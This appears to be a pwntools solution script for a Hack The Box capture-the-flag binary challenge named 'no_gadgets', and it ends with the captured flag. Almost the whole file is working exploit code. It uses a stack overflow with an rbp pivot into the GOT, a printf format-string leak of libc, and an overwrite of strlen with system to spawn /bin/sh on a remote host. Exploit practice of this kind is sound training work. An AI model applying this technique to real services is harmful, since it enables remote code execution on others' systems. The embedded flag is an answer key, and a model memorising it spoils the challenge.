#!/usr/bin/env python3

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

context.log_level = 'info'
context.arch = 'amd64'
context.binary = 'no_gadgets'

libc = ELF('libc.so.6')

###

if DEBUG:
    r = process('./no_gadgets')
else:
    r = remote('94.237.62.42', 53676)

r.recvuntil(b'Data: ')
gdb.attach(r, 'b *main+158')
input()
'''
.text:000000000040121B                 mov     rdx, cs:stdin@GLIBC_2_2_5 ; stream
.text:0000000000401222                 lea     rax, [rbp+s]
.text:0000000000401226                 mov     esi, 1337h      ; n
.text:000000000040122B                 mov     rdi, rax        ; s
.text:000000000040122E                 call    _fgets
'''

# rop is saved rbp + ret gadget + above binary jump
p = b'\x00' * 128 + p64(context.binary.got.puts + 0x80) + p64(0x000000000401275) + p64(0x000000000040121B)
r.sendline(p)

# We use got.puts to hold our payload
p = b'%p%p%p%p' # got.puts
# Then we repopulate all got entries by plt resolver
p += p64(0x0000000000401211) # got.strlen -> remapped to printf
p += p64(0x0000000000401056) # got.printf
p += p64(0x0000000000401066) # got.fgets
p += p64(0x0000000000401076) # got.setvbuf
p += p64(0x0000000000401086) # got.exit

assert b'\x0a' not in p, 'Wrong char in payload'
r.sendline(p)
r.recvline()

d = r.recv(64)
d = d.decode()
leak = int(d.split('0x')[1], 16)
libc.address = leak - 0x219b23

log.info('leak: %#x' % leak)
log.info('libc.address %#x' % libc.address)

p = b'/bin/sh\x00' # got.puts
p += p64(libc.sym.system) # got.strlen

r.sendline(p)

r.interactive()
r.close()

# flag: HTB{wh0_n3eD5_rD1_wH3n_Y0u_h@v3_rBp!!!_faab91486a952bba093c2b558da614e2}
